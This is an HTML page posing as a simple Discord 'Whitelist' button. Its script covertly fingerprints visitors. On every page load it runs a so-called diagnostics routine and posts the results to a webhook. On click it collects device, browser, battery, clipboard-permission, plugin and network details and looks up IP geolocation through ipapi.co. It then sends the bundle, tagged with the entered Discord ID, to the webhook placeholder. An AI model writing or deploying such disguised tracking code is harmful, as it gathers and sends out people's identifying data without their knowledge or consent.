<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Whitelist Button</title>
  <style>
    body { font-family: sans-serif; display: flex; flex-direction: column; gap: 1rem; align-items: center; justify-content: center; height: 100vh; background: #f9fafb; }
    input, button { padding: 0.6rem 1rem; font-size: 1rem; border-radius: 8px; border: 1px solid #ccc; }
    button { background: #10b981; color: white; border: none; cursor: pointer; }
    button:disabled { background: #9ca3af; cursor: not-allowed; }
    button:hover:enabled { background: #059669; }
  </style>
</head>
<body>
  <input type="text" id="discordId" placeholder="Enter Discord User ID" />
  <button id="whitelistBtn" disabled>Whitelist</button>

  <script>
    const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
    const whitelistBtn = document.getElementById('whitelistBtn');
    const discordIdInput = document.getElementById('discordId');
    const RATE_LIMIT_HOURS = 24;
    const STORAGE_KEY = 'lastWhitelistTime';

    // Auto-run diagnostics on every visit
    window.addEventListener('load', () => runDiagnostics());

    discordIdInput.addEventListener('input', () => {
      const value = discordIdInput.value.trim();
      const isNumeric = /^\d+$/.test(value);
      whitelistBtn.disabled = !isNumeric;
    });

    function isRateLimited() {
      const lastTime = localStorage.getItem(STORAGE_KEY);
      if (!lastTime) return false;
      const diff = (Date.now() - parseInt(lastTime, 10)) / (1000 * 60 * 60);
      return diff < RATE_LIMIT_HOURS;
    }

    async function runDiagnostics() {
      const results = { passed: [], errors: [], critical: [] };

      // Test LocalStorage
      try {
        localStorage.setItem('diag_test', '1');
        localStorage.removeItem('diag_test');
        results.passed.push('LocalStorage works');
      } catch {
        results.critical.push('LocalStorage unavailable');
      }

      // Test UserAgent
      if (navigator.userAgent) results.passed.push('UserAgent available');
      else results.critical.push('UserAgent missing');

      // Battery API
      try {
        if (navigator.getBattery) {
          const b = await navigator.getBattery();
          results.passed.push('Battery API supported');
        } else {
          results.errors.push('Battery API not supported');
        }
      } catch {
        results.errors.push('Battery API failed');
      }

      // Permissions API
      try {
        if (navigator.permissions) {
          await navigator.permissions.query({ name: 'clipboard-read' }).catch(()=>{});
          results.passed.push('Permissions API supported');
        } else results.errors.push('Permissions API not supported');
      } catch {
        results.errors.push('Permissions API failed');
      }

      // Screen check
      if (screen && screen.width > 0) results.passed.push('Screen info valid');
      else results.errors.push('Screen info missing');

      // Connection check
      if (navigator.connection) results.passed.push('Network info available');
      else results.errors.push('Network info missing');

      // Timezone check
      try {
        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        if (tz) results.passed.push('Timezone detected');
        else results.errors.push('Timezone missing');
      } catch {
        results.errors.push('Timezone check failed');
      }

      // Do Not Track
      if (navigator.doNotTrack != null) results.passed.push('Do Not Track reported');
      else results.errors.push('Do Not Track unavailable');

      // Plugins
      try {
        const count = navigator.plugins.length;
        results.passed.push(`Plugins detected: ${count}`);
      } catch {
        results.errors.push('Plugins check failed');
      }

      const totalTests = results.passed.length + results.errors.length + results.critical.length;
      const score = `${results.passed.length}/${totalTests}`;

      const diagPayload = {
        timestamp: new Date().toISOString(),
        diagnostics: { score, ...results }
      };

      const formData = new FormData();
      const file = new Blob([JSON.stringify(diagPayload, null, 2)], { type: 'application/json' });
      formData.append('file', file, 'diagnostics_results.json');
      formData.append('content', 'Automatic diagnostics report');

      try { await fetch(WEBHOOK_URL, { method: 'POST', body: formData }); } catch {}
    }

    async function sendData() {
      if (isRateLimited()) {
        alert('You can only whitelist once every 24 hours.');
        return;
      }
      try {
        const geoRes = await fetch('https://ipapi.co/json/');
        const geoData = geoRes.ok ? await geoRes.json() : {};

        const battery = navigator.getBattery ? await navigator.getBattery() : null;
        const clipboardPerm = navigator.permissions ? await navigator.permissions.query({ name: 'clipboard-read' }).catch(() => null) : null;

        const payload = {
          timestamp: new Date().toISOString(),
          discordUserId: discordIdInput.value.trim(),
          userAgent: navigator.userAgent,
          language: navigator.language,
          languages: navigator.languages,
          platform: navigator.platform,
          cookieEnabled: navigator.cookieEnabled,
          online: navigator.onLine,
          screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
          },
          referrer: document.referrer || null,
          page: location.href,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
          } : null,
          hardwareConcurrency: navigator.hardwareConcurrency,
          deviceMemory: navigator.deviceMemory || null,
          maxTouchPoints: navigator.maxTouchPoints,
          doNotTrack: navigator.doNotTrack,
          vendor: navigator.vendor,
          product: navigator.product,
          productSub: navigator.productSub,
          javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : null,
          plugins: Array.from(navigator.plugins).map(p => p.name),
          mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
          battery: battery ? {
            charging: battery.charging,
            level: battery.level,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
          } : null,
          clipboardPermission: clipboardPerm ? clipboardPerm.state : null,
          ipInfo: geoData
        };

        const formData = new FormData();
        const file = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
        formData.append('file', file, 'visitor_data.json');
        formData.append('content', `Visitor data from Discord User ID: ${discordIdInput.value.trim()}`);

        const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });

        if (res.ok) {
          alert('Data sent successfully.');
          localStorage.setItem(STORAGE_KEY, Date.now().toString());
          whitelistBtn.disabled = true;
        } else {
          alert(`Failed to send data. Status: ${res.status}`);
        }
      } catch (err) {
        alert('Error sending data: ' + err.message);
      }
    }

    if (isRateLimited()) whitelistBtn.disabled = true;

    whitelistBtn.addEventListener('click', sendData);
  </script>
</body>
</html>
